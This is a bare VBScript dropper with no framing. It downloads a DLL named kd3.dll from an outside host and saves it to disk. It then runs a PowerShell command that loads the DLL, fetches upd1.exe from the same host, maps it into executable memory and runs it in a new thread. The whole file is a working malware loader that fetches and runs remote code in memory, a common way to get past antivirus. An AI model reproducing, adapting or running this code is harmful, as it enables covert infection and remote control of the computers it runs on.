Set fso  = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
folder = fso.GetParentFolderName(WScript.ScriptFullName)
path = folder & "\kd3.dll"
http.Open "GET", "https://automacoes-remote-control.sgploq.easypanel.host/kd3.dll", False
http.Send
Set st = CreateObject("ADODB.Stream")
st.Type = 1
st.Open
st.Write http.ResponseBody
st.SaveToFile path, 2
st.Close
Set sh = CreateObject("WScript.Shell")
cmd = "powershell -NoExit -Command ""$w=[Reflection.Assembly]::LoadFile('" & folder & "\kd3.dll');$b=(New-Object Net.WebClient).DownloadData('https://automacoes-remote-control.sgploq.easypanel.host/upd1.exe');$i=[K.Win]::ToImage($b);$m=[K.Win]::VirtualAlloc(0,[uint32]$i.Length,12288,64);[K.Win]::RelocateImg($i,$m);[Runtime.InteropServices.Marshal]::Copy($i,0,$m,$i.Length);$t=[IntPtr]::Zero;$h=[K.Win]::CreateThread(0,0,$m,0,0,[ref]$t);Write-Host ('IMG=' + $i.Length + ' CREATE=' + $h + ' TID=' + $t);if($h -eq 0){$d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action]);Write-Host 'DIRECT';$d.Invoke()}else{Start-Sleep -Seconds 6;$ec=[uint32]::Zero;[void][K.Win]::GetExitCodeThread($h,[ref]$ec);Write-Host ('THREAD=' + $ec.ToString('X8'))}"""
sh.Run cmd, 1, False
